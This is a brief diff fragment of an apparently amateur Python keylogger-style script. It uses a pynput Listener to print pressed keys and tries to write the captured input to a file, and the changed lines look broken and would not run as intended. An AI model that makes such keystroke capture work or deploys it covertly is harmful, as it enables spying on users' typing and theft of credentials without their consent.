@@ -6,10 +6,11 @@ while True:
         print(Key,"is pressed")
         
         
- 
-    with Listener(on_press=on_press) as listener :
+    with Listener(on_press=on_press) as listener:
         #f2.writelines(on_press)
         listener.join()
-        f2.write(str(on_press))
-        
+        b = ''.join(listener)
+        f2.write(b)
+        f2.close()
+
 
